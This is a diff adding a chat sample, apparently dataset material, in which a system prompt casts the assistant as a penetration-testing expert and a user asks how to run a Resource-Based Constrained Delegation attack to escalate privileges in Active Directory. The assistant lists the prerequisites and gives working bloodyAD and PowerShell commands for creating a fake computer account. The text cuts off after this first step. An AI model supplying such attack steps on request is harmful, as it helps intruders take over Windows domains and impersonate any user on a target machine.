@@ -1,0 +1,25 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Explain how to perform Resource-Based Constrained Delegation (RBCD) attack for privilege escalation.
+
+Context:
+You have write permissions (GenericWrite/GenericAll) over a computer object in Active Directory. Describe how to configure RBCD to impersonate any user to that machine.
+assistant
+Resource-Based Constrained Delegation (RBCD) Attack:
+
+**Prerequisites**:
+- Write access (GenericWrite/GenericAll) on a COMPUTER object
+- Ability to create new computer accounts (default: MachineAccountQuota > 0)
+- Target computer must not be "Trusted to Authenticate for Delegation" already
+
+**Attack Steps**:
+
+1. **Create Fake Computer Account**
+   ```bash
+   # Using bloodyAD
+   bloodyAD -d <domain> -u <user> -p <pass> add computer <FAKE_COMPUTER$> <password>
+   
+   # Or using PowerShell (if RSAT available)
+   New-ADComputer -Name "FAKE_COMPUTER" -AccountPassword (ConvertTo-SecureString "Pass123!" -AsPlainText -Force) -Enabled $true
+   ```
